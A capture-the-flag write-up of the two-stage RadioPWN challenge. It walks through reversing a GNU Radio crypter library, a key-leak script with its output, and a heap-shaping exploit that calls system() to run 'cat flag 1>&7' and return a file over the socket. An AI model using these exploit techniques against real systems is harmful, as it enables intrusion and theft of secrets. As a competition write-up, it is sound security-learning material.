---
layout: post
title:  "RadioPWN Writeup"
date:   2025-12-20 18:55:15 +0200
categories: writeups
---
This article presents a technical analysis of selected challenges from Ctrl+Space CTF 2025, a space-themed capture-the-flag competition focused on low-level systems, reversing, and exploitation. The primary focus is a high-difficulty PWN / reversing task involving a custom space communication protocol implemented on top of GNU Radio (SDR), for which I provided remote assistance to the eventual winning team during the competition. In addition, the article includes a second challenge that I analyzed and solved independently after the event concluded.

# Part 1 — Introduction and Challenge Setup

## Introduction
The challenge begins with a ZIP archive containing a small server implementation and its supporting artifacts. Although the folder structure appears simple at first glance, a closer inspection reveals that the server implements a custom encryption/decryption protocol based on a GNU Radio extension named `mhackeroni.crypter`. Our goal is to understand how the server processes incoming data and ultimately leverage this behavior to leak the secret flags.

![hierarchy](/assets/image24.png)

## Key Artifacts
The most relevant files for the first stage of the challenge are:

#### radiopwn.py
This Python script implements a small TCP server. For every incoming connection, the server:
- Receives arbitrary bytes.
- Passes them to `mhackeroni.crypter`, initialized with a path to `/tmp/keys`.
- Sends the encrypted output back to the client.

In other words, the server itself performs no validation or logic, it simply acts as a pass-through wrapper around the crypter library.

![radiopwn.py](/assets/image6.png)

#### Dockerfile
Most of the challenge files are copied directly into the container.
The image’s `CMD` executes `start.sh`, which handles all runtime setup.

#### start.sh
![start.sh](/assets/image14.png)
This script generates a keys file, where one of the keys is the flag.
 The flag is injected at runtime via an environment variable, which is configured inside `docker-compose.yml`.
On the real challenge server, this value is replaced naturally with the actual secret flag.

![environment variable flag](/assets/image10.png)

## Background: What is GNU Radio and Why Is It Used Here?

GNU Radio is an open-source toolkit widely used in software-defined radio (SDR) applications. It provides:

* A modular signal-processing framework
* A message-passing architecture (PMTs, PDUs, blocks)
* Support for building custom DSP blocks in C++ or Python

In real-world SDR systems, GNU Radio components are chained together to process radio packets, demodulate signals, or implement custom protocols. Developers can extend GNU Radio by creating their own shared libraries, which expose new "blocks" that can be called from Python or integrated into flowgraphs.

### Why Does This Challenge Include libgnuradio-mhackeroni.so?

In the context of this challenge, the crypter library (`libgnuradio-mhackeroni.so`) is implemented as a **custom GNU Radio block**. Although the challenge itself does not involve actual radio signals, the authors reused GNU Radio’s message-handling architecture to:

1. Structure the encryption/decryption logic as a GNURadio PDU-processing block
2. Leverage the PMT (Polymorphic Type) system to pass structured metadata + payload buffers
3. Fit the challenge into a familiar flowgraph model

In practice, this means that incoming TCP bytes are wrapped into GNU Radio’s PDU format:

* car(pair) → metadata
* cdr(pair) → raw `u8vector` payload

The crypter block processes the payload, decrypts/encrypts it using per-key algorithms, and emits a transformed PDU.

## Interacting with the server 
Connecting to the server manually (e.g., `nc 127.0.0.1 5000`) and sending arbitrary bytes immediately reveals interesting behavior:
- The crypter library logs that it loaded the keys file.
- The server returns untransformed data, which means we need to craft special data for the crypter to modify it.

![server prints](/assets/image3.png)

![pdu debug print](/assets/image23.png)

At this point, we already understand:
1. The server accepts arbitrary user input.
2. All input is processed by `mhackeroni.crypter`.
3. The output is sent back unchanged unless the crypter decides to modify it.  
4. The crypter receives a keys table, where one entry contains the flag.  

This strongly suggests that our path to the flag must involve tricking the crypter into leaking key material.

## Reversing the Crypter
The logical next step is to reverse the GNU Radio extension. Opening `libgnuradio-mhackeroni.so.1.0.0.0` in IDA and searching for relevant strings, such as "pdu received"
![pdu received](/assets/image15.png)
quickly leads to the main function `handle_pdu` that processes incoming PDUs. This is the core of the challenge and will later become the foundation for both Stage 1 (key leakage) and Stage 2 (RCE).

![handle_pdu](/assets/image8.png)

# Part 2 — Understanding the Crypter: Algorithm Table and Core Processing Flow

## Reversing the Crypter Library
Once inside the `mhackeroni.crypter` shared object, the first important observation is that the library builds an internal algorithm dispatch table at runtime. This table maps algorithm IDs to function pointers responsible for encrypting or decrypting payloads.
During initialization, the crypter allocates memory for this table and stores references to several algorithm implementations, such as the simple XOR-based algorithm that becomes crucial later.

![algo list](/assets/image12.png)

Later, during PDU parsing, the crypter retrieves the appropriate algorithm by indexing into this table:  

![choose algo](/assets/image19.png)
![assign](/assets/image21.png)
![call algo](/assets/image16.png)

This design becomes a vulnerability in Stage 2, where sending an out-of-bounds algo_id allows us to force the crypter to call arbitrary addresses located immediately after the table in heap memory.  

## Investigating the XOR Algorithm
Looking at the XOR function confirms that it performs a classic cyclic-key XOR:

![xor algo](/assets/image4.png)

This means that if we submit a payload consisting entirely of zero bytes, the output will equal the key repeated across the length of the payload, making this a perfect key-leak primitive.
However, understanding when this XOR function is actually applied requires diving deeper into the central routine: `handle_pdu`.

## Deep-Dive Into handle_pdu
After reversing the verbose function surrounding PDU processing, the high-level behavior becomes clear.
The function:
1. Validates the incoming PMT pair.
2. Extracts the raw byte buffer.
3. Scans the buffer byte-by-byte.
4. Interprets sections starting with `0x17` as encrypted blocks.
5. Decrypts those blocks in place using the appropriate algorithm.
6. Collapses escape sequences like `0x17 0x17` into a single literal `0x17`.
7. Re-emits the processed buffer as a new PDU.

### Frame Structure
Encrypted segments follow a strict format:

`0x17, key_id (1B), len_lo (1B), len_hi (1B), algo_id (1B), payload[len]`

Where:
- `key_id` index selects which key to use from the keys table
- `len_lo`,`len_hi` define the payload length
- `algo_id` selects the encryption algorithm
- `payload[]` is the encrypted block processed in-place

If the prefix is `0x17 0x17`, it is treated as an escaped literal byte rather than the start of a frame.

### Main scan loop over the bytes
The loop walks the input and handles escaping and encrypted blocks. There are two pointers/indexes visible in the decompiled code:
- `i` (named `v63`) – input index (how far we’ve consumed the original buffer).  
- `out` (named `v64`) – where to write the resulting bytes (de-escaping can shrink). In practice the code writes back into the same array (in-place) and advances `out` as it produces output.  

Two cases inside the loop:

#### 3a) Regular byte, not 0x17
```c
if (in[i] != 0x17) {
    *out++ = in[i++];
    continue;
}
```

#### 3b) Starts with 0x17 → look ahead

```c
marker     = in[i]            // == 0x17
key_id     = in[i+1]
len_lo     = in[i+2]
len_hi     = in[i+3]
algo_id    = in[i+4]
payload    = &in[i+5]
payloadLen = uint16_t(len_lo | (len_hi << 8))
```

Now two sub-cases:

- **Escaped 0x17:** if `key_id == 0x17` (i.e., the sequence is `0x17 0x17`), this is the escape for a literal `0x17`.
Action: write a single `0x17` to `*out`, advance `i` by `2`, advance `out` by `1`. (This collapses the doubled byte.)

- **Encrypted block:** otherwise we have a PDU crypto block.
  - It logs: "Decrypting <payloadLen> bytes\n".

It picks the algorithm from the table by algo_id:

```c
algo = algos[algo_id];  // e.g., none_algo or xor_algo
```

It looks up (or creates & caches) an "encrypter" context for this key_id.

Decrypt in place: finally it calls the selected algorithm function pointer like:

```c
algo(/*dest=*/payload, /*size=*/payloadLen, /*source/context=*/encrypter->ctx);
```

For xor_algo (provided below), that means:

```c
for each j in [0..payloadLen-1]:
    payload[j] ^= key[ j % key_len ];
```

After decryption, the loop skips over the whole encoded block in the input:

```c
i += 1 /*0x17*/ + 1 /*key*/ + 2 /*len*/ + 1 /*algo*/ + payloadLen;
```

When `i` reaches `in_len`, the loop ends.

### pseudo-code

```text
on handle_pdu(pair):
  if !is_pair(pair): log error; return;

  meta = car(pair)
  data = cdr(pair)
  if !is_u8vector(data): publish(pair) and return;

  buf, len = u8vector_elements(data)
  out = buf

  i = 0
  while (i < len):
    if (buf[i] != 0x17) {
      *out++ = buf[i++]
      continue
    }

    // 0x17 prefix
    if (i+1 < len && buf[i+1] == 0x17) {
      *out++ = 0x17
      i += 2
      continue
    }

    key_id  = buf[i+1]
    payloadLen = uint16(buf[i+2] | buf[i+3] << 8)
    algo_id = buf[i+4]
    payload = &buf[i+5]

    encr = map_by_key_id.get_or_create(key_id, algo_id, key_table[key_id])
    encr->fn(/*dest*/payload, /*size*/payloadLen, /*ctx*/encr->ctx)

    i += 5 + payloadLen  // skip whole encoded block
  end

  // (buffer modified in place)
  publish( cons(meta, make_u8vector(buf, len)) )  // out port "pdus"
```

That’s the core logic: detect framed blocks, decrypt those blocks in place using a per-key algorithm, de-escape 0x17 0x17, and re-emit the processed PDU.

# Part 3 — Leveraging the Parsing Logic: Building the Key-Leak Exploit (Stage 1)

## Understanding the Leak Primitive

With the crypter’s behavior reversed, we now have everything needed to turn it into a key oracle. The crucial observation is simple:
If the XOR algorithm is applied to a payload of all-zero bytes, the output is just the key repeated.
Why?
Because XOR with zero is an identity operation:
`0x00 ^ KeyByte = KeyByte`

Since the crypter decrypts the payload in place and then returns the modified buffer to us, all we have to do is:
Craft a valid frame.

Each frame follows the format:
`0x17 | key_id | len_lo | len_hi | algo_id | payload[len]`

To leak a key:
- `0x17` marks the start of an encrypted block
- `key_id` selects which key to fetch from /tmp/keys
- `len_lo, len_hi` define the size of the payload
- `algo_id = 0x01` selects the XOR algorithm
- `payload = b'\x00' * len` ensures the output is uninterrupted key bytes

This gives us full control over which key the crypter uses and how much of it is revealed.

## Automating the Leakage for All Keys

Because the server stores multiple keys (16 in this challenge), we can simply loop over all key IDs and build one frame for each:

```python
def leak_keys(): # leak key
    # Format: 0x17, key_id, len_lo, len_hi, algo_id, payload...
    for key_id in range(0xf):
        declared_len = 0x40
        algo_id = 0x1
        frame = bytes([MARK, key_id]) + pack('<H', declared_len) + bytes([algo_id]) + declared_len * b'\x00'
        send_bytes(frame)
```

When sent to the server, every response contains the decrypted key, repeating until the declared payload length is exhausted.

You can clearly see that key 0x0C contains the placeholder flag: `space{FAKE_FLAG}`

Stage 1 complete — the entire key table (and the flag) has been leaked successfully:
```sh 
sending b'\x17\x00@\x00\x01\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00'
recv: b'\x17\x00@\x00\x01N7hafqgUXHeFlD0cN7hafqgUXHeFlD0cN7hafqgUXHeFlD0cN7hafqgUXHeFlD0c\x00'
sending b'\x17\x01@\x00\x01\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00'
recv: b'\x17\x01@\x00\x01MuWOPeKQX8h7T3xUMuWOPeKQX8h7T3xUMuWOPeKQX8h7T3xUMuWOPeKQX8h7T3xU\x00'
sending b'\x17\x02@\x00\x01\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00'
recv: b'\x17\x02@\x00\x0101enESlYdVA1CbBT01enESlYdVA1CbBT01enESlYdVA1CbBT01enESlYdVA1CbBT\x00'
sending b'\x17\x03@\x00\x01\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00'
recv: b'\x17\x03@\x00\x01KKDXrhdgJwqVzYiGKKDXrhdgJwqVzYiGKKDXrhdgJwqVzYiGKKDXrhdgJwqVzYiG\x00'
sending b'\x17\x04@\x00\x01\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00'
recv: b'\x17\x04@\x00\x01dydAVgUp2oPazZtFdydAVgUp2oPazZtFdydAVgUp2oPazZtFdydAVgUp2oPazZtF\x00'
sending b'\x17\x05@\x00\x01\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00'
recv: b'\x17\x05@\x00\x011CByrKzq9nqJVDZi1CByrKzq9nqJVDZi1CByrKzq9nqJVDZi1CByrKzq9nqJVDZi\x00'
sending b'\x17\x06@\x00\x01\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00'
recv: b'\x17\x06@\x00\x01RNXF5u9vTNwTpiJ0RNXF5u9vTNwTpiJ0RNXF5u9vTNwTpiJ0RNXF5u9vTNwTpiJ0\x00'
sending b'\x17\x07@\x00\x01\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00'
recv: b'\x17\x07@\x00\x01FcUoW42TXSANcH9BFcUoW42TXSANcH9BFcUoW42TXSANcH9BFcUoW42TXSANcH9B\x00'
sending b'\x17\x08@\x00\x01\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00'
recv: b'\x17\x08@\x00\x01bRRFBnEz3P2SJhDdbRRFBnEz3P2SJhDdbRRFBnEz3P2SJhDdbRRFBnEz3P2SJhDd\x00'
sending b'\x17\t@\x00\x01\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00'
recv: b'\x17\t@\x00\x017EO1aD4jb8tOd8zJ7EO1aD4jb8tOd8zJ7EO1aD4jb8tOd8zJ7EO1aD4jb8tOd8zJ\x00'
sending b'\x17\n@\x00\x01\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00'
recv: b'\x17\n@\x00\x01IBas9wldIjuaKb9aIBas9wldIjuaKb9aIBas9wldIjuaKb9aIBas9wldIjuaKb9a\x00'
sending b'\x17\x0b@\x00\x01\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00'
recv: b'\x17\x0b@\x00\x01C23f0xYARVNdBjx7C23f0xYARVNdBjx7C23f0xYARVNdBjx7C23f0xYARVNdBjx7\x00'
sending b'\x17\x0c@\x00\x01\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00'
recv: b'\x17\x0c@\x00\x01space{FAKE_FLAG}space{FAKE_FLAG}space{FAKE_FLAG}space{FAKE_FLAG}\x00'
sending b'\x17\r@\x00\x01\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00'
recv: b'\x17\r@\x00\x01reZW1DbJp7K7M6whreZW1DbJp7K7M6whreZW1DbJp7K7M6whreZW1DbJp7K7M6wh\x00'
sending b'\x17\x0e@\x00\x01\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00'
recv: b'\x17\x0e@\x00\x01hTSrY8C7v31MfTbahTSrY8C7v31MfTbahTSrY8C7v31MfTbahTSrY8C7v31MfTba\x00'
```

Now with the real server:
`space{1m_1n_j4p4n_c4n_y0u_g3t_rc3_f0r_m3?_7yk90lah543}`

Victory!

![discord](/assets/image13.png)

# Part 4 — Stage 2 Overview: From Key Leakage to Remote Code Execution (Radiopwn2)

Stage 1 focused on abusing the crypter’s parsing logic to leak all encryption keys, including the embedded flag.
Stage 2, however, is a completely different style of challenge: here the flag is stored in a file, not inside the keys table. Nothing in the program ever reads this file during normal operation.
Therefore, leaking keys is no longer useful, we now need code execution.

## What Changes in Radiopwn2?

In the second challenge, the flag is located in a file called flag (with the contents `space{FAKE_FLAG_2}` locally). This file is:
- Copied into the container via `Dockerfile`
![copy flag file](/assets/image9.png)
- Owned by the same user that runs the service
- Completely unknown to the program logic (never opened)

This means:
To obtain the second flag, we must make the crypter or its host process execute a command that manually reads the file.
Since the program itself never references it, information disclosure is insufficient, we must escalate to RCE.

## Initial Recon: What Exploitation Primitives Do We Have?

From reversing Stage 1 and exploring the crypter behavior deeper, two powerful primitives emerge:

### 1. Buffer Over-Read Primitive

If we send a frame where the declared payload length (`len_lo | len_hi << 8`) is greater than the actual number of payload bytes we provide, the crypter will:

- Decrypt in place up to the declared length
- Read past the end of our buffer
- Echo back whatever memory lies beyond
- This gives us memory disclosure, especially useful for examining heap layouts.

### 2. Arbitrary Function Pointer Call (Limited)

Recall the algorithm dispatch table:
`algos[algo_id] → function pointer`

The table is dynamically allocated on the heap during initialization. If we send an `algo_id` larger than the table size, the crypter will read out-of-bounds memory and interpret whatever 8 bytes it finds there as a function pointer.
And then it will call it.
This means we can hijack execution, but only to addresses located immediately after the algorithm table allocation on the heap.
This becomes the core RCE primitive for the stage.

## Is ASLR an Issue?

![checksec](/assets/image5.png)

Fortunately:
- PIE is disabled
- The service runs a fixed `python3.12` binary
- libc is loaded at predictable addresses on every restart

This means:
`system()` has a stable, known address.

![system function ida](/assets/image2.png)

## Why Heap Shaping Matters

The algorithm table is allocated at runtime with a small fixed size:
- Table entry size: 8 bytes
- Total allocation: ~0x18 bytes (3 algorithms × 8 bytes)

These small allocations are handled by tcache bins (for size 0x20).
To control what comes immediately after this allocation in memory, we must carefully:
- Create allocations
- Free allocations
- Refill tcache bins
- Trigger new allocations in specific order

![heap bins cmd](/assets/image7.png)
![heap bins output](/assets/image1.png)

The goal is to place our crafted frame buffer directly after the algorithm table.
When that happens:
- The crypter interprets our payload as `algos[algo_id]`
- The fake function pointer at the right offset becomes `system()`
- The argument passed to the function is our controlled command string

This results in arbitrary command execution inside the container, allowing us to read and exfiltrate the flag.

## Remote GDB Setup for Analyzing the Container

To properly analyze the heap behavior and verify the exploit, I needed the ability to attach GDB to the Python process running inside the container. The default challenge image did not include any debugging hooks, so a small modification was required.

### 1. Exposing a Debug Port

In `docker-compose.yml`, I added an additional port mapping:

```yaml
ports:
  - "7777:7777"
```

This gave me a TCP port through which GDB could connect to the process.

### 2. Launching the Python Process Under GDBserver

Inside the container, I modified the startup command so the service runs under `gdbserver` instead of executing Python directly:

```bash
gdbserver 0.0.0.0:7777 python3 radiopwn.py
```

This attaches the Python interpreter to GDBserver and opens a remote debugging session on port 7777.

### 3. Connecting From the Host

With the container running, I used the host’s GDB to connect remotely:

```bash
gdb python3
(gdb) target remote localhost:7777
```

At this point, I could:

* Set breakpoints inside `handle_pdu`
* Inspect the tcache bins and current heap layout
* Step through the allocation of the algorithm table
* Confirm the placement of my controlled payload after heap shaping

This setup was crucial for identifying the correct offsets, validating that the `system()` pointer was reachable via out-of-bounds `algo_id`, and ensuring the exploit would be deterministic.

## Prerequisite: Understanding system()’s Argument

To extract the flag, we need a working shell command whose output returns over our open socket.
Examining the file descriptors inside the container:

Before communication:
![fd before](/assets/image18.png) 
After communication:
![fd after](/assets/image17.png) 
- FD 7 corresponds to our TCP connection
- Writing to FD 7 sends bytes directly back to us

Therefore, a simple and elegant command works:

```sh
cat flag 1>&7
```

This:
- Reads the flag file
- Redirects stdout to FD 7 (our socket)
- Sends the flag back to the attacker

This command becomes the basis of the crafted payload injected into heap memory.

# Part 5 — Stage 2 Exploit: Heap Shaping, Fake Algo, and Calling system()

In Stage 2, we already know:
- We can make the crypter call a function pointer from the algorithm table using a controlled `algo_id`.
- `system()` has a known, stable address (PIE disabled, fixed Python binary).
- The flag lives in a file (`flag`) that the program never reads by itself.

Now we want to turn the out-of-bounds `algo_id` into a reliable call to `system(cmd)`, where `cmd` is fully controlled and reads the flag back to our socket.
To achieve this, we need to:
1. Shape the heap so that our frame buffer sits immediately after the algorithm table allocation.
2. Place the `system()` address at a predictable offset relative to the start of that allocation.
3. Use an out-of-bounds `algo_id` so that `algos[algo_id]` points into our controlled data, where the fake function pointer (`system`) lives.
4. Make sure the "argument" passed to that function is a pointer to our command string (`"cat flag 1>&7"`).

## Heap Internals: tcache

The algorithm table is allocated with size `0x18` bytes (3 entries × 8-byte function pointers). On glibc, this goes into the tcache bin for size 0x20.
We can also influence other allocations of similar sizes by sending frames and causing the crypter to allocate and free temporary structures. By carefully choosing:
- How many frames we send
- Their sizes
- In which order allocations and frees occur

we can influence which freed chunks are reused for:
- The algorithm table allocation
- The buffer holding our final crafted frame

The end goal is to obtain a heap layout like:
`[ 0x18-byte chunk: algos table ]
[ 0x... byte chunk: our frame buffer (controlled) ]`

I found a combination of frames send that results this layout, which is **sending 2 frames size 0x18 and then an exploit frame size 0x28**.
I achieved this by debugging, examining the tcache bins and the memory layout.

Once this happens, any out-of-bounds index into `algos[]` will read into our frame buffer and interpret it as an array of function pointers.

## Placing system() on the Heap

Remember the call pattern:
`algos[algo_id](payload, len, ctx);`

Conceptually, what we want is:
````
algos[algo_id] = system;
payload        = "cat flag 1>&7"
```

So we craft our frame payload to contain:
- A command string: `"cat flag 1>&7`" (with spaces for alignment).
- A null terminator (`\x00`).
- The address of `system()` immediately afterwards.
- Padding to fill the rest of the declared payload.

Because the crypter interprets `algos[algo_id]` as a function pointer, if we pick the correct index (i.e., the correct offset into this buffer), it will land exactly on the 8-byte chunk containing the `system()` address.
In the exploit, the final payload looks like:

```python
payload = (
    b'cat  flag 1>&7    '               # command string + spaces for alignment
    b'\x00'                             # null terminator
    b'\xc0\x06\x42\x00\x00\x00\x00\x00' # system address
    b'\x00\x00\x00\x00\x00\x00\x00\x00'
)
```

Here:
- The ASCII part is the shell command.
- The `\x00\xc0\x06\x42...` sequence encodes the address of `system()` (little-endian).
- The extra zeros are padding to keep the memory nicely shaped.

You also choose the frame length so that:
5 bytes (frame header) + command + `\0` + system address
neatly fill a 0x28-sized region when combined.

## Finding the Right algo_id Offset

After heap shaping, we set a breakpoint inside `handle_pdu`, at the moment the algo table is allocated, and capture its address. Then we inspect memory around it.

Not far after the algos allocation, we can see:
- The table itself
- Our frame buffer
- The command string
- The embedded `system()` pointer

By dumping memory, we can count how many 8-byte steps it takes from the start of the `algos` allocation to reach the `system()` address inside our payload.
That count turns out to be:
`0x11 (17 decimal)`

Since each entry is 8 bytes, `algos[0x11]` ends up reading the fake pointer embedded in our frame, which we set to `system()`.
Thus:
`algo_id = 0x11`
→ `algos[0x11] = *(heap_base + 0x11 * 8)`
→ That location holds the `system()` address

When the crypter calls:
`algos[algo_id](payload, len, ctx);`

It effectively becomes:
`system("cat flag 1>&7");`

because `payload` points into our frame buffer where the command string lives.

## Making the Layout Deterministic: Crashing the Server

Heap exploitation can be fragile if the layout changes between runs. Luckily, the challenge setup uses supervisord to automatically restart the service when it crashes.

![supervisord](/assets/image22.png)

This gives us a powerful advantage:
- We can deliberately crash the process to reset it into a fresh, predictable heap state.
- After restart, the sequence of allocations and frees we perform will be the same every time, as long as we send the same frames in the same order.

By combining:
- Knowledge of tcache behavior
- A stable restart mechanism
- Controlled allocations via frames

we get a deterministic heap layout, which means the offset (`algo_id = 0x11`) and the position of our crafted chunk stay reliable.  

## Triggering the Exploit and Getting the Flag

With everything aligned:
1. We perform the heap-shaping sequence.
2. We send the final crafted frame with:
- A suitably shaped payload containing `"cat flag 1>&7"` and `system()` address.
- `algo_id = 0x11`.

3. The crypter interprets `algos[0x11]` as our fake function pointer.
4. It calls `system("cat flag 1>&7")`.

![output flag2](/assets/image11.png)

Result: the second flag is printed back over the socket.

Victory!

We’ve escalated from a controlled key-decryption primitive in Stage 1
to full code execution with `system()` in Stage 2 and successfully exfiltrated `space{FAKE_FLAG_2}`.


Here is the working exploit:
```python
def send_bytes(b):
    print("sending", b)
    try:
        with socket.create_connection((HOST, PORT), timeout=2) as s:
            s.sendall(b)
            s.settimeout(TIMEOUT)
            try:
                resp = s.recv(4096)
                print("recv:", resp)
            except socket.timeout:
                print("no response (timeout)")
    except ConnectionRefusedError:
        print("connection refused — is the server listening on 127.0.0.1:5000?")
    except Exception as e:
        print("send error:", e)

def send_size(size):
    key_id = 0x0
    declared_len = size - 5 # 5 is header size
    algo_id = 0
    small_payload = b'\xAA' * declared_len  
    frame = bytes([MARK, key_id]) + pack('<H', declared_len) + bytes([algo_id]) + small_payload
    send_bytes(frame)

def full_exploit():
    # Sending frame that crashes via algo_id 19
    key_id = 0x0
    declared_len = 0xff
    algo_id = 19 # non existing algo to crash
    small_payload = b'\xAA' * declared_len  
    frame = bytes([MARK, key_id]) + pack('<H', declared_len) + bytes([algo_id]) + small_payload
    send_bytes(frame)

    # Wait a bit to let server recover
    time.sleep(5)

    # Send 2 frames to shape tcache state
    send_size(0x18)
    send_size(0x18)

    # Send frame to trigger the exploit
    key_id = 0x0
    declared_len = 0x28 - 5
    algo_id = 17 # offset into OOB function-pointer
    small_payload = b'cat  flag 1>&7    \x00\xc0\x06\x42\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00'
    frame = bytes([MARK, key_id]) + pack('<H', declared_len) + bytes([algo_id]) + small_payload
    send_bytes(frame)
```

# Part 6 — Conclusion

The Radiopwn challenges demonstrate how small design flaws compound into powerful exploitation paths.
In Stage 1, a weak framing format and unauthenticated XOR "encryption" turned the crypter into a key oracle. Because decryption occurred in place and the output was returned to the client, sending zero-filled payloads directly exposed the keys, including the flag.
Stage 2 expanded this into code execution. Two issues made this possible:
- Out-of-bounds algorithm indexing, letting the attacker treat heap data as function pointers.
- Predictable heap allocation (tcache), allowing precise placement of attacker-controlled payloads after the algorithm table.

By shaping the heap, embedding a `system()` pointer, and supplying a command string that redirected output to our socket, we achieved RCE and read the flag file.
In short: weak crypto framing, unchecked lengths, and unsafe function-pointer indexing combined into a clean and stable attack chain, from key leakage to full remote command execution.